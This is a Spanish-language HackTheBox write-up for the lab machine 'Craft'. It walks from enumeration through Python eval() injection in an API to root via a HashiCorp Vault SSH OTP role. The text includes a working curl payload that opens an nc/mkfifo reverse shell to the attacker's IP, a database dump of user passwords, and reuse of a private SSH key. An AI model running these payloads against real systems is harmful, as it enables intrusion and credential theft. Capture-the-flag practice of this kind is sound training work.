---
title: Craft
platform: HackTheBox
difficulty: Medium
os: Linux
releaseDate: 2019-07-19
date: 2026-09-13
publishedAt: 2026-11-23
tags: [gogs, api, eval, git, ssh, Linux, Medium, HTB]
image: ./thumb.png
imageShape: round
userRank: 5653
rating: 4.9
---

---

# Descripcion

La máquina Craft comienza con la explotación de una vulnerabilidad de ejecución de comandos en una API debido al uso inseguro de `eval()`. Mediante esta vulnerabilidad conseguimos acceso a un contenedor y extraemos credenciales de la base de datos. Estas nos permiten acceder a Gogs y recuperar una clave SSH privada, obteniendo acceso al usuario `gilfoyle`. Finalmente, aprovechamos HashiCorp Vault y su sistema de autenticación OTP mediante SSH para conseguir acceso como `root`.

---

# Enumeración

## Nmap

> Comenzamos realizando un escaneo de todos los puertos TCP para identificar los servicios expuestos en la máquina.

```bash
$ nmap -p- --open --min-rate 5000 -Pn -n -sS -v 10.129.56.119

Starting Nmap 7.99 ( [https://nmap.org](https://nmap.org) ) at 2026-09-10 21:39 +0200
Initiating SYN Stealth Scan at 21:39
Scanning 10.129.56.119 [65535 ports]
Discovered open port 22/tcp on 10.129.56.119
Discovered open port 443/tcp on 10.129.56.119
Discovered open port 6022/tcp on 10.129.56.119
Completed SYN Stealth Scan at 21:39, 12.07s elapsed (65535 total ports)
Nmap scan report for 10.129.56.119
Host is up (0.047s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
6022/tcp open  x11

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
           Raw packets sent: 65755 (2.893MB) | Rcvd: 65535 (2.621MB)
```

> Una vez identificados los puertos abiertos, realizamos un segundo escaneo para obtener más información sobre los servicios y sus versiones. También utilizamos los scripts predeterminados de Nmap para recopilar información adicional.

```bash
$ nmap -p22,443,6022 -sC -sV 10.129.56.119

Starting Nmap 7.99 ( [https://nmap.org](https://nmap.org) ) at 2026-09-10 21:40 +0200
Nmap scan report for 10.129.56.119
Host is up (0.12s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: About
|_http-server-header: nginx/1.15.8
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 46.13 seconds
```

> Añadimos un dominio para acceder al servicio web. En este caso, utilizaremos `craft.htb`.

## Web

> Utilizamos WhatWeb para identificar las tecnologías y componentes empleados por el servidor web.

```bash
$ whatweb [https://craft.htb](https://craft.htb)
```

![Pasted-image-20261123015829.png](./Images/Pasted-image-20261123015829.png)

- Web

> Accedemos al sitio web para comprobar su contenido y buscar posibles puntos de entrada.

![Pasted-image-20261123015833.png](./Images/Pasted-image-20261123015833.png)

> Buscamos posibles `subdominios` asociados al dominio principal.

```bash
$ gobuster vhost -u [https://craft.htb](https://craft.htb) -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 --append-domain -k
```

![Pasted-image-20261123015837.png](./Images/Pasted-image-20261123015837.png)

> Además, encontramos en la propia página web un enlace que apunta a otro `subdominio`.

![Pasted-image-20261123015843.png](./Images/Pasted-image-20261123015843.png)

![Pasted-image-20261123015840.png](./Images/Pasted-image-20261123015840.png)

> Añadimos los tres dominios identificados al archivo `/etc/hosts` para poder resolverlos localmente.

```text
api.craft.htb
gogs.craft.htb
vault.craft.htb
```

## `api.craft.htb`

> Accedemos al subdominio de la API y comenzamos a analizar su funcionamiento.

![Pasted-image-20261123015848.png](./Images/Pasted-image-20261123015848.png)

> Observamos que dispone de un sistema de `login`. Sin embargo, podemos realizar una petición `GET` al endpoint `brew` sin necesidad de autenticarnos.

```bash
$ curl -X GET "[https://api.craft.htb/api/brew/?page=0&bool=true&per_page=2](https://api.craft.htb/api/brew/?page=0&bool=true&per_page=2)" -H "accept: application/json" -k | jq

{
  "items": [
    {
      "id": 12,
      "brewer": "10 Barrel Brewing Company",
      "name": "Pub Beer",
      "style": "American Pale Lager",
      "abv": "0.050"
    },
    {
      "id": 13,
      "brewer": "18th Street Brewery",
      "name": "Devil's Cup",
      "style": "American Pale Ale (APA)",
      "abv": "0.066"
    }
  ],
  "page": 1,
  "pages": 1169,
  "per_page": 2,
  "total": 2338
}
```

> Sin embargo, si intentamos realizar una petición `POST` para crear un nuevo `brew`, obtenemos el siguiente resultado:

```bash
$ curl -X POST "[https://api.craft.htb/api/brew/](https://api.craft.htb/api/brew/)" -H "accept: application/json" -H "Content-Type: application/json" -d "{ \"id\": 0, \"brewer\": \"string\", \"name\": \"string\", \"style\": \"string\", \"abv\": \"string\"}" -k | jq

{
  "message": "Invalid token or no token found."
}
```

> Por lo tanto, parece que necesitamos estar autenticados para poder realizar operaciones de escritura en la API.

## `gogs.craft.htb`

> Accedemos al subdominio de Gogs, una plataforma de alojamiento y gestión de repositorios Git.

![Pasted-image-20261123015855.png](./Images/Pasted-image-20261123015855.png)

> Si investigamos en la sección `Explore`, encontramos un repositorio llamado `craft_api`.

![Pasted-image-20261123015859.png](./Images/Pasted-image-20261123015859.png)

> Al analizar el código de esta API encontramos algo interesante en la función encargada de procesar las peticiones `POST` para añadir un nuevo `brew`.

![Pasted-image-20261123015904.png](./Images/Pasted-image-20261123015904.png)

## Codigo fuente API

- Función

```python
    @auth.auth_required
    @api.expect(beer_entry)
    def post(self):
        """
        Creates a new brew entry.
        """

        # make sure the ABV value is sane.
        if eval('%s > 1' % request.json['abv']):
            return "ABV must be a decimal value less than 1.0", 400
        else:
            create_brew(request.json)
            return None, 201
```

> Observamos que se está utilizando la función `eval()` y que recibe directamente el parámetro `abv` proporcionado por el usuario a través del JSON.
>
> La función `eval()` evalúa una expresión escrita en Python. Al utilizarla directamente sobre un valor controlado por el usuario, podemos intentar inyectar expresiones Python arbitrarias y conseguir que se ejecuten en el servidor.

> Continuamos investigando el repositorio y encontramos algo interesante en el historial de cambios.

![Pasted-image-20261123015910.png](./Images/Pasted-image-20261123015910.png)

> Entre los `commits` realizados encontramos uno que añade un `script` utilizado para realizar pruebas.

![Pasted-image-20261123015914.png](./Images/Pasted-image-20261123015914.png)

> En este archivo podemos ver cómo se utilizan un usuario y una contraseña directamente en el código para autenticarse. Vamos a comprobar si estas credenciales siguen siendo válidas.

```text
user: dinesh
pass: 4aUh0A8PbVJxgd
```

> Si revisamos el código de la función encargada de gestionar el inicio de sesión, encontramos lo siguiente:

```python
def auth_login():
    auth = request.authorization
    try: 
        auth_results = User.query.filter(User.username == auth.username, User.password == auth.password).one()
    except: 
        auth_results = ''

    if type(auth_results) is User:

        token = jwt.encode({'user': auth.username, 'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=5)}, secret)

        return jsonify({'token': token.decode('UTF-8')})

    return make_response('Authentication failed', 401, {'WWW-Authenticate': 'Basic realm="Craft API Login"'})
```

> La función recibe las credenciales mediante la cabecera de autenticación HTTP Basic. Si son correctas, genera un token JWT que tiene una duración de cinco minutos.
>
> Por tanto, debemos realizar la petición al endpoint `login` utilizando las credenciales que hemos encontrado.

```bash
$ curl -X GET "[https://api.craft.htb/api/auth/login](https://api.craft.htb/api/auth/login)" -H "accept: application/json" -u "dinesh:4aUh0A8PbVJxgd" -k

{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzg5MTY5MjAwfQ.j_dz0PRF6-ffllohUp3SRyrmjOVqibqGHU2FysO3lt0"}
```

# Shell como root@api

## Explotando eval()

> Ahora que tenemos un token de sesión, podemos intentar aprovechar la vulnerabilidad de `eval()` que encontramos anteriormente en la función encargada de crear un nuevo `brew`.
>
> Antes de probarlo contra la máquina, vamos a comprobar su funcionamiento localmente.

```python
$ python3

>>> eval('%s > 1' % "__import__('os').system('echo hola')")
hola
False
```

> Como podemos observar, conseguimos ejecutar el comando `echo hola` mediante la expresión que hemos inyectado. Esto confirma que podemos aprovechar `eval()` para ejecutar comandos del sistema operativo.
>
> Ahora vamos a comprobar si podemos ejecutar comandos directamente en la máquina vulnerable.

- Abrimos `tcpdump` para capturar un paquete ICMP y comprobar si el comando se ejecuta en el servidor.

```bash
sudo tcpdump -i tun0 ICMP
```

- Enviamos una petición para crear un nuevo `brew`, incluyendo un comando `ping` dentro del parámetro `abv`.

```bash
$ curl -X POST "[https://api.craft.htb/api/brew/](https://api.craft.htb/api/brew/)" -H "accept: application/json" -H "X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzg5MTcwNDU1fQ._ZGWnKzNfz0NE0etMsJ0IHVo3IMgiJkFoa3LFhXk5xY" -H "Content-Type: application/json" -d '{"id": 0, "brewer": "aaa", "name": "aaa", "style": "aaa", "abv": "__import__(\"os\").system(\"ping -c 1 10.10.14.119\")"}' -k
```

![Pasted-image-20261123015921.png](./Images/Pasted-image-20261123015921.png)

> Recibimos el paquete ICMP en nuestra máquina, por lo que confirmamos que hemos conseguido ejecutar comandos de forma remota en el servidor.

> Ahora vamos a intentar obtener una `reverse shell` para conseguir una terminal interactiva en la máquina.

- Abrimos un listener con `nc` para recibir la conexión.

```bash
$ nc -nvlp 7777
```

- Enviamos una nueva petición `POST` incluyendo el comando para establecer la `reverse shell`.

```bash
$ curl -X POST "[https://api.craft.htb/api/brew/](https://api.craft.htb/api/brew/)" -H "accept: application/json" -H "X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzg5MTcwNzg0fQ.ufPRfyJ_jiiFx2p1oo3ZvTAga5cJHY4uuWDyFaGN7Cs" -H "Content-Type: application/json" -d '{"id": 0, "brewer": "aaa", "name": "aaa", "style": "aaa", "abv": "__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.119 7777 >/tmp/f\")"}' -k
```

![Pasted-image-20261123015927.png](./Images/Pasted-image-20261123015927.png)

> Recibimos una `shell` y, aparentemente, nos encontramos dentro de un contenedor con el usuario `root`.

# Shell como gilfoyle

## Enumeracion

> Comenzamos a enumerar el entorno, pero únicamente encontramos los archivos relacionados con la API. Si investigamos su contenido, encontramos un archivo llamado `settings.py` que contiene credenciales de acceso a la base de datos.

- `settings.py`

```python
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

> Si intentamos ejecutar el cliente `mysql`, comprobamos que no está instalado en el contenedor.
>
> Sin embargo, en la ruta principal de la aplicación encontramos un archivo llamado `dbtest.py` que podemos utilizar para realizar consultas a la base de datos mediante Python.

```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try:
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
```

> Si ejecutamos el script, comprobamos que consigue conectarse correctamente a la base de datos y devuelve un registro.

## Enumeracion de BBDD

```bash
$ python3 dbtest.py

{'id': 12, 'brewer': '10 Barrel Brewing Company', 'name': 'Pub Beer', 'abv': Decimal('0.050')}
```

> Vamos a modificar el parámetro `sql` para que la consulta se reciba mediante un argumento de la línea de comandos. También cambiaremos `fetchone()` por `fetchall()`, de manera que podamos recuperar todos los registros devueltos por una consulta en lugar de únicamente el primero.
>
> Como no tenemos instalado `nano`, crearemos un nuevo archivo directamente desde la terminal utilizando `echo`.

```bash
echo """
#!/usr/bin/env python

import pymysql
import sys
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try:
    with connection.cursor() as cursor:
        sql = sys.argv[1]
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)

finally:
    connection.close()
""" > dbtest1.py
```

- Comprobamos que el nuevo script funciona correctamente ejecutando una consulta de prueba.

```bash
$ python3 dbtest1.py 'SELECT "test"'

[{'test': 'test'}]
```

- Enviamos una consulta para conocer las bases de datos existentes.

```bash
$ python3 dbtest1.py 'select group_concat(schema_name) from information_schema.schemata'

[{'group_concat(schema_name)': 'information_schema,craft'}]
```

- Comprobamos qué tablas contiene la base de datos `craft`.

```bash
$ python3 dbtest1.py "select group_concat(table_name) from information_schema.tables where table_schema='craft'"

[{'group_concat(table_name)': 'brew,user'}]
```

- Seleccionamos todos los registros de la tabla `user` para recuperar los usuarios y sus respectivas contraseñas.

```bash
$ python3 dbtest1.py "select * from user"

[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```

> Probamos a conectarnos mediante `SSH` utilizando las credenciales encontradas, pero no conseguimos acceso.

## Gogs

> Por tanto, vamos a probar estas credenciales en la plataforma `Gogs`.

![Pasted-image-20261123015935.png](./Images/Pasted-image-20261123015935.png)

> Conseguimos acceder con el usuario `gilfoyle`. Al revisar su cuenta, observamos que tiene un repositorio privado. Vamos a comprobar su contenido.

![Pasted-image-20261123015940.png](./Images/Pasted-image-20261123015940.png)

> Dentro del repositorio encontramos una carpeta `.ssh` que contiene una clave privada llamada `id_rsa`.

![Pasted-image-20261123015943.png](./Images/Pasted-image-20261123015943.png)

## SSH

> Vamos a importar la clave privada a nuestra máquina e intentar utilizarla para conectarnos mediante `SSH`.

```bash
$ ssh gilfoyle@10.129.57.63 -i id_rsa
```

![Pasted-image-20261123015948.png](./Images/Pasted-image-20261123015948.png)

> El sistema nos solicita una `passphrase` para utilizar la clave privada. Probamos con la misma contraseña que hemos utilizado para acceder a Gogs.

![Pasted-image-20261123015953.png](./Images/Pasted-image-20261123015953.png)

> Conseguimos autenticarnos correctamente y obtenemos acceso al usuario `gilfoyle` en la máquina principal.

# Shell como root

## Enumeracion

> Una vez dentro de la máquina, vamos a utilizar `pspy64` para monitorizar los procesos que se ejecutan y comprobar si existen tareas programadas mediante `CRON`.

![Pasted-image-20261123015957.png](./Images/Pasted-image-20261123015957.png)

> Observamos que cada minuto se ejecuta el siguiente script: `/opt/admin/admin.sh`.

```bash
$ ls -la /opt/admin/admin.sh

ls: cannot access '/opt/admin/admin.sh': Permission denied
```

> No tenemos permisos para acceder al archivo ni a su directorio. Como no encontramos nada más interesante en la máquina, volvemos a investigar el repositorio de `Gogs`.
>
> Allí encontramos una carpeta llamada `vault` que contiene un script interesante.

![Pasted-image-20261123020002.png](./Images/Pasted-image-20261123020002.png)

```bash
#!/bin/bash
# set up vault secrets backend
vault secrets enable ssh
vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

> Observamos que el script utiliza un comando llamado `vault`. Vamos a comprobar qué opciones ofrece ejecutándolo sin argumentos.

```bash
$ vault


Usage: vault <command> [args]

Common commands:
    read        Read data and retrieves secrets
    write       Write data, configuration, and secrets
    delete      Delete secrets and configuration
    list        List data or secrets
    login       Authenticate locally
    agent       Start a Vault agent
    server      Start a Vault server
    status      Print seal and HA status
    unwrap      Unwrap a wrapped secret

Other commands:
    audit          Interact with audit devices
    auth           Interact with auth methods
    kv             Interact with Vault's Key-Value storage
    lease          Interact with leases
    namespace      Interact with namespaces
    operator       Perform operator-specific tasks
    path-help      Retrieve API help for paths
    plugin         Interact with plugins and catalog
    policy         Interact with policies
    secrets        Interact with secrets engines
    ssh            Initiate an SSH session
    token          Interact with tokens
```

## SSH

> El script parece habilitar el motor de secretos `SSH` de Vault y configurar un rol llamado `root_otp`, que permite generar credenciales OTP para conectarse mediante SSH como el usuario `root`.
>
> Vamos a probar a ejecutar los mismos comandos que aparecen en el script.

Primero intentamos habilitar el motor de secretos SSH:

```bash
$ vault secrets enable ssh

Error enabling: Error making API request.

URL: POST [https://vault.craft.htb:8200/v1/sys/mounts/ssh](https://vault.craft.htb:8200/v1/sys/mounts/ssh)
Code: 400. Errors:

- existing mount at ssh/
```

> El resultado indica que el motor de secretos `SSH` ya está habilitado. Por tanto, podemos continuar con la configuración del rol.

Ejecutamos el segundo comando del script:

```bash
$ vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0

Success! Data written to: ssh/roles/root_otp
```

> La configuración se ha aplicado correctamente. Ahora vamos a consultar las opciones disponibles para conectarnos mediante SSH utilizando Vault.

```bash
$ vault ssh -h
```

![Pasted-image-20261123020008.png](./Images/Pasted-image-20261123020008.png)

> Vault nos muestra un ejemplo de cómo establecer una conexión. Vamos a realizar la prueba utilizando el usuario `root` y el modo `otp`.

```bash
$ vault ssh -mode=otp root@localhost
```

![Pasted-image-20261123020012.png](./Images/Pasted-image-20261123020012.png)

> El sistema nos solicita una contraseña. Se trata del `OTP` (*One-Time Password*) generado para la sesión SSH.
>
> Introducimos el código proporcionado por Vault y conseguimos acceder correctamente como `root`.

![Pasted-image-20261123020017.png](./Images/Pasted-image-20261123020017.png)